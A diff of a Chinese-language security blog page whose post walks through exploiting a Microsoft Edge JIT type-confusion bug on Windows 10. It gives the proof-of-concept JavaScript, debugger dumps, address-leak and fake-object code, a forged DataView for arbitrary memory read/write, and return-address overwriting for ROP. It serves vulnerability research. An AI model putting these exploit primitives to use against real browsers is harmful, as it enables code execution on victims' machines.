@@ -12,7 +12,7 @@
     
     <title>
         
-            归档: 2014/8 | 
+            Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE | 
         
         b2ahex&#39;s blog
     </title>
@@ -67,15 +67,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="https://b2ahex.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="归档: 2014/8 | b2ahex&#39;s blog">
+    <meta property="og:title" content="Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE | b2ahex&#39;s blog">
     <meta property="og:image" content="/blog/img/favicon.png" />
     <meta property="og:description" content="">
     
 
     
+        <meta property="article:published_time" content="7月 18, 2018" />
+        <meta property="article:modified_time" content="8月 09, 2018" />
+    
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="归档: 2014/8 | b2ahex&#39;s blog">
+    <meta name="twitter:title" content="Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE | b2ahex&#39;s blog">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="/blog/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -83,13 +86,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://b2ahex.github.io/blog/archives/2014/08/index.html" />
+        <link rel="canonical" href="https://b2ahex.github.io/blog/2018/07/18/Win10下的浏览器沙箱逃逸/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "b2ahex&#39;s blog",
+        "logo": "/blog/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "b2ahex",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/blog/img/favicon.png"
+        },
+        "description": "Hi, nice to meet you"
+    },
+    "headline": "Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE",
+    "url": "https://b2ahex.github.io/blog/2018/07/18/Win10下的浏览器沙箱逃逸/index.html",
+    "datePublished": "7月 18, 2018",
+    "dateModified": "8月 09, 2018",
+    "description": "",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://b2ahex.github.io"
+    }
+}
+</script>
 
 
     
@@ -279,100 +312,301 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-分析篇"><span class="post-toc-number">1.</span> <span class="post-toc-text">1. 分析篇</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-利用篇"><span class="post-toc-number">2.</span> <span class="post-toc-text">2. 利用篇</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Reference"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Reference:</span></a></li></ol></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/blog/2014/08/08/利用kaspersky白文件的恶意样本分析/">利用kaspersky白文件的恶意样本分析</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            之前分析过的样本，随便贴点东西上来吧…
-by @b2ahex
-一、样本信息
-样本名称：280836636_37EEC1A29D316ED1E5E766B599DC32A1.bin样本大小： 64,599 字节文件类型：EXE文件病毒名称：HttpBrowser样本MD5： 37eec1a29d316ed1e5e766b599dc32a1样本SHA256：a89c21dd608c51c4bf0323d640f816e464578510389f9edcf04cd34090decc91
-
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/blog/2014/08/08/利用kaspersky白文件的恶意样本分析/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/blog/img/avatar.png" width="44px" height="44px" alt="b2ahex's avatar">
-            </div>
-            <div>
-                <strong>b2ahex</strong>
-                <span>8月 08, 2014</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/blog/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/blog/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/blog/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>b2ahex</strong>
+        <span>7月 18, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE&url=https://b2ahex.github.io/blog/2018/07/18/Win10下的浏览器沙箱逃逸/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Win10下的浏览器沙箱逃逸 Browser and Kernel Exploitation - EDGE&url=https://b2ahex.github.io/blog/2018/07/18/Win10下的浏览器沙箱逃逸/index.html&via=b2ahex" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://b2ahex.github.io/blog/2018/07/18/Win10下的浏览器沙箱逃逸/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://b2ahex.github.io/blog/2018/07/18/Win10下的浏览器沙箱逃逸/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>作者：b2ahex  </p>
+<p>感觉好久没有更新过了，记录一下之前在win10环境下的 edge + kernel 漏洞利用过程，最终实现沙箱逃逸：</p>
+<h3 id="1-分析篇"><a href="#1-分析篇" class="headerlink" title="1. 分析篇"></a>1. 分析篇</h3><p>POC来源：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1290" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1290</a><br><img src="/blog/img/src/edge_1807_1.png" alt="">  </p>
+<p>调试运行poc样本之后，发现对象被改写为0x1234，引发异常访问<br><img src="/blog/img/src/edge_1807_2.png" alt="">  </p>
+<p>发现问题出现在JIT代码中，从type中找到生成的JIT代码，poc中增加Math.cosh.call(func)，给math::cosh下面位置下断点查看jit地址：<br><img src="/blog/img/src/edge_1807_3.png" alt="">    </p>
+<p>分析后截取JIT代码片段：<br><img src="/blog/img/src/edge_1807_4.png" alt=""></p>
+<p>最终引发0x1234(2.3023e-320)说明a被转换为对象数组，从poc中可以看到回调中 a[0] = {}; 会导致a的类型转变，继续跟踪JIT代码查找调用源：<br><img src="/blog/img/src/edge_1807_5.png" alt=""></p>
+<p>在执行ToNumber之前查看Array a的类型为NativeFloatArray：</p>
+<blockquote>
+<p>dq r13 (array a)<br>0x000001EC7C4FC620  00007ffd056d7030 000001ec7c4b9140<br>0x000001EC7C4FC630  0000000000000000 0000000000000005<br>0x000001EC7C4FC640  0000000000000002 000001ec7c4fc660<br>0x000001EC7C4FC650  000001ec7c4fc660 000001e47aa78a80<br>0x000001EC7C4FC660  0000000200000000 0000000000000003<br>0x000001EC7C4FC670  0000000000000000 0000000000001234  </p>
+<p>dq 0x0000001ec7c4b9140 (a.type == 0x1f == TypeIds_NativeFloatArray)<br>0x000001EC7C4B9140  000000000000001f </p>
+</blockquote>
+<p>执行ToNumber之后，此时Array a的类型从NativeFloatArray变为Array：</p>
+<blockquote>
+<p>dq r13 (array a)<br>0x000001EC7C4FC620  00007ffd056d60c8 000001ec7c4b8fc0<br>0x000001EC7C4FC630  0000000000000000 0000000000000005<br>0x000001EC7C4FC640  0000000000000002 000001ec7c4fc660<br>0x000001EC7C4FC650  000001ec7c4fc660 0000000000000000  </p>
+<p>dq 0x0000001ec7c4b8fc0 (a.type == 0x1c == TypeIds_Array)<br>0x000001EC7C4B8FC0  000000000000001c</p>
+</blockquote>
+<p>执行后面  a[0] = 2.3023e-320 时，由于回调函数的作用，数组a的类型已经发生改变，但是JIT代码却没有对数组a的操作进行检查，最终引发类型类型混淆，用户可以控制任意数据最为指针<br><img src="/blog/img/src/edge_1807_6.png" alt="">  </p>
+<p>回顾POC：  </p>
+<pre><code>生成jit代码
+// force to optimize     
+for (var i = 0; i &lt; 0x10000; i++)        func(a, b, i);
+
+func(a, b, {valueOf: () =&gt; {
+    设置一个valueOf回调        
+    a[0] = {};   
+    return 0;    }
+});
+
+触发回调，修改a数组类型，造成类型混淆  
+function func(a, b, c) {
+    a[0] = 1.2;   //数组a是NativeFloatArray    
+    b[0] = c;     //这里触发设置之前的valueOf回调，将数组a从float转换成Array 
+    a[1] = 2.2;    
+    a[0] = 2.3023e-320; //将任意值设置为指针
+}
+
+a[0].toString();  //造成异常访问
+</code></pre><h3 id="2-利用篇"><a href="#2-利用篇" class="headerlink" title="2. 利用篇"></a>2. 利用篇</h3><p>清楚了这个漏洞带来的能力，即构造任意对象指针，我们需要考虑构造什么样的对象，以及如果泄露这个对象的地址。</p>
+<p>Array的buf部分拥有完全可控的内存块，供我们构造内存：</p>
+<pre><code>var arr = new Array(
+     0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,
+      0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,
+      0x41414141,0x41414141,0x41414141,0x41414141,0x41414141
+        )  
+</code></pre><p><img src="/blog/img/src/edge_1807_7.png" alt="">   </p>
+<p>由于a[0]此处保存着对象指针，修改代码如下，使func直接返回，泄露对象地址：  </p>
+<pre><code>function func(a, b, c) {
+    a[0] = 1.2;
+    b[0] = c;
+    a[1] = 2.2;
+    return a[0]; //执行完callback后，a已经变成array，但是jit中还把他当作NativeFloatArray
+}
+
+var arr = new Array(
+  0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,
+  0x41414141,0x41414141,0x41414141,0x41414141,0x41414141,
+  0x41414141,0x41414141,0x41414141,0x41414141,0x41414141
+ )
+
+farr64[0] =  func(a, b, {valueOf: () =&gt; {
+    a[0] = arr;   
+    return 0;
+}});
+
+//这里uarr[1]存放高地址，uarr[0]存放低地址，组合得到泄露的arr地址
+var leakaddr = uarr32[1]*0x100000000+uarr32[0]
+alert(&quot;leakaddr:&quot; + leakaddr.toString(16))
+</code></pre><p>成功获取到对象地址，此时buf在arr对象偏移+0x58的位置：<br><img src="/blog/img/src/edge_1807_8.png" alt=""> </p>
+<p>现在需要在arr对象的buf部分构造dataview，实现任意地址读写。<br>首先利用漏洞，设置泄露出的arr对象+0x58的位置得到指向buf的对象：  </p>
+<pre><code>var a_a = [1.1, 2.2];
+fakeaddr = (leakaddr+0x58) * 4.9406564584124654E-324;  
+setobj(a_a, b, {valueOf: () =&gt; {
+        a_a[0] = {};   
+        return 0;
+    }});
+fakeobj = a_a[0];
+</code></pre><p>设置dataview内存布局，由于arr是32位，DataView是64位，所以需要写两次，其中要构造的内容有对象类型，type指针，缓冲区大小，arraybufffer指针（找块0内存），arr[14],arr[15]指向目标缓冲区，后续通过修改arr[14],arr[15],完成任意地址读写,类似PALETTE-&gt;pFirstColor/BITMAP-&gt;pvScan0：<br><img src="/blog/img/src/edge_1807_9.png" alt=""> </p>
+<p>由于getUint32/setUint32是32位操作，所以进行64位读写需要分开执行2次，其对应的操作方式：<br>GetBitmapBits/GetPaletteEntries —&gt;  DataView.prototype.getUint32.call(fakeobj,0);<br>SetBitmapBits/SetPaletteEntries —&gt;  DataView.prototype.setUint32.call(fakeobj,0);<br>总结一下，设置arr[14],arr[15]，执行 DataView.prototype.getUint32.call/DataView.prototype.setUint32.call完成任意地址读写：<br><img src="/blog/img/src/edge_1807_10.png" alt="">  </p>
+<p>有了任意地址读写权限之后，下面要控制程序流程，因为cfg的存在，我们通过修改返回地址来劫持rip，所以需要泄露出一个栈地址：<br><img src="/blog/img/src/edge_1807_11.png" alt="">  </p>
+<p>找到Recycler对象就能找到stackbase,比如：<br><img src="/blog/img/src/edge_1807_12.png" alt=""><br>使用weakmap对象，验证地址：<br><img src="/blog/img/src/edge_1807_13.png" alt=""><br>接下来从stackbase开始搜索参数找到当前函数的返回地址，改写返回地址即可构造ROP，劫持程序执行流程：<br><img src="/blog/img/src/edge_1807_14.png" alt="">   </p>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h4><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1290" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1290</a><br>microsoft edge browser             @holynop</p>
+
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/blog/2018/05/21/ACG bypass using UnmapViewOfFile 调试笔记/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
